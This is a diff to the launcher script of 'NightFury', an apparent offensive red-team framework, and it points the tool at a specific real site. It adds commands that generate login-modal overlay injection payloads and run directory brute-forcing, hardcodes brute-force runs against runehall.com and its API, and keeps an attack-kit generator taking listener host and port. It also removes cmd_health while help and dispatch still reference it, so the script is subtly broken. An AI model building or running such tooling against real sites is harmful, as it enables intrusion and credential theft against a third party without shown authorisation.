@@ -32,7 +32,7 @@ print_banner() {
     ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
     ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                         Professional Red Team Operations Framework
-                                    Version 2.2 (Plugin-Enabled)
+                                    Version 2.3 (Full-Scope)
 EOF
 }
 
@@ -47,12 +47,38 @@ cmd_status() {
     python3 "${NIGHTFURY_HOME}/core/detection_engine.py" -q | python3 -m json.tool
 }
 
+# Command: Injection Engine
+cmd_inject() {
+    local type="${1:-login_modal}"
+    print_info "Generating Injection Payload: $type"
+    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
+    python3 -c "from modules.exploit_pro.injection_engine import InjectionEngine; e = InjectionEngine(); print(e.get_injector_script('$type'))"
+}
+
+# Command: IODR Control
+cmd_iodr() {
+    local action="${1:-monitor}"
+    print_info "IODR Action: $action"
+    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
+    python3 -c "from core.iodr_system import IODRSystem; i = IODRSystem(); i.monitor_environment() if '$action' == 'monitor' else i.trigger_response('$action')"
+}
+
+# Command: Brute-force
+cmd_brute() {
+    local target="$1"
+    if [[ -z "$target" ]]; then
+        print_error "Usage: nightfury.sh brute <url>"
+        return 1
+    fi
+    print_info "Starting Automated Brute-force on: $target"
+    python3 "${NIGHTFURY_HOME}/modules/recon_pro/dir_brute.py" "$target"
+}
+
 # Command: RuneHall Plugin
 cmd_runehall() {
     local subcmd="$1"
     shift
     export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    
     case "$subcmd" in
         recon)
             print_info "Launching RuneHall Recon..."
@@ -61,70 +87,40 @@ cmd_runehall() {
         kit)
             local lhost="${1:-127.0.0.1}"
             local lport="${2:-4444}"
-            print_info "Generating RuneHall Attack Kit (LHOST: $lhost, LPORT: $lport)..."
+            print_info "Generating RuneHall Attack Kit..."
             python3 -c "import json; from modules.plugins.runehall_pro import RuneHallPlugin; p = RuneHallPlugin('${NIGHTFURY_CONFIG}/c2_runehall.yaml'); print(json.dumps(p.generate_attack_kit('$lhost', $lport), indent=2))"
             ;;
+        brute)
+            print_info "RuneHall Directory Brute-force..."
+            python3 "${NIGHTFURY_HOME}/modules/recon_pro/dir_brute.py" "https://runehall.com"
+            python3 "${NIGHTFURY_HOME}/modules/recon_pro/dir_brute.py" "https://api.runehall.com"
+            ;;
         *)
-            print_error "Usage: nightfury.sh runehall [recon|kit]"
+            print_error "Usage: nightfury.sh runehall [recon|kit|brute]"
             return 1
             ;;
     esac
 }
 
-# Command: DNS Bypass
-cmd_bypass() {
-    local domain="$1"
-    if [[ -z "$domain" ]]; then
-        print_error "Usage: nightfury.sh bypass <domain>"
-        return 1
-    fi
-    print_info "Starting Cloudflare Bypass & DNS Deep-dive for: $domain"
-    python3 "${NIGHTFURY_HOME}/modules/recon_pro/dns_bypass.py" "$domain"
-}
-
-# Command: XSS Generate
-cmd_xss() {
-    print_info "Generating Aggressive XSS Payloads..."
-    python3 "${NIGHTFURY_HOME}/modules/exploit_pro/xss_generator.py"
-}
-
-# Command: BeEF Integration
-cmd_beef() {
-    local module="$1"
-    if [[ -z "$module" ]]; then
-        print_error "Usage: nightfury.sh beef <module>"
-        echo "Available modules: pretty_theft, internal_ip, port_scanner, visited_domains"
-        return 1
-    fi
-    print_info "Generating BeEF payload: $module"
-    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    python3 -c "import sys; sys.path.append('${NIGHTFURY_HOME}'); from modules.beef_integration.beef_core import BeEFIntegration; b = BeEFIntegration(base_path='${NIGHTFURY_HOME}/modules/beef_integration/payloads'); print(b.get_payload('$module'))"
-}
-
-# Command: Health Check
-cmd_health() {
-    print_info "Running health check..."
-    python3 "${NIGHTFURY_HOME}/core/detection_engine.py"
-}
-
 # Command: Help
 cmd_help() {
     cat << EOF
-NightFury Plugin-Enabled - Command Reference
+NightFury Full-Scope - Command Reference
 
 CORE:
   status              Show framework status
   health              Run health check
-  bypass <domain>     Cloudflare Bypass & DNS Deep-dive
-  xss                 Generate aggressive XSS payloads
-  beef <module>       Generate BeEF-integrated payloads
-  runehall <cmd>      RuneHall.com Specialized Plugin (recon|kit)
+  iodr [monitor|HIGH] IODR Detection & Response Control
+  inject [type]       Generate Overlay/Chat Injection payloads
+  brute <url>         Automated Directory Brute-forcing
+  runehall <cmd>      RuneHall.com Specialized Plugin (recon|kit|brute)
   panic               Emergency cleanup and exit
 
 EXAMPLES:
-  nightfury.sh bypass target.com
-  nightfury.sh runehall kit 192.168.1.10 4444
-  nightfury.sh beef pretty_theft
+  nightfury.sh inject login_modal
+  nightfury.sh brute https://runehall.com
+  nightfury.sh iodr monitor
+  nightfury.sh runehall brute
 EOF
 }
 
@@ -135,9 +131,9 @@ main() {
     shift || true
     case "$command" in
         status) cmd_status "$@" ;;
-        bypass) cmd_bypass "$@" ;;
-        xss) cmd_xss "$@" ;;
-        beef) cmd_beef "$@" ;;
+        inject) cmd_inject "$@" ;;
+        iodr) cmd_iodr "$@" ;;
+        brute) cmd_brute "$@" ;;
         runehall) cmd_runehall "$@" ;;
         health) cmd_health "$@" ;;
         help|--help|-h) print_banner; cmd_help ;;
